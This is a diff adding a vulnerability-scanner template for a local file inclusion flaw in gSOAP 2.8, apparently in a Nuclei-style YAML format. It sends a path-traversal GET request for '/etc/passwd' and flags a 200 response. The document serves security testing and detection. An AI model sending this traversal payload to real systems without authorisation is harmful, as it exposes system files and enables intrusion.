@@ -1,0 +1,24 @@
+id: gsoap-lfi
+brief:
+    title: gSOAP 2.8 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: gSOAP 2.8 is vulnerable to local file inclusion.
+    label:
+        - edb
+        - gsoap
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../../etc/passwd'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: close
+      signs:
+        - "on": status
+          status:
+            - 200
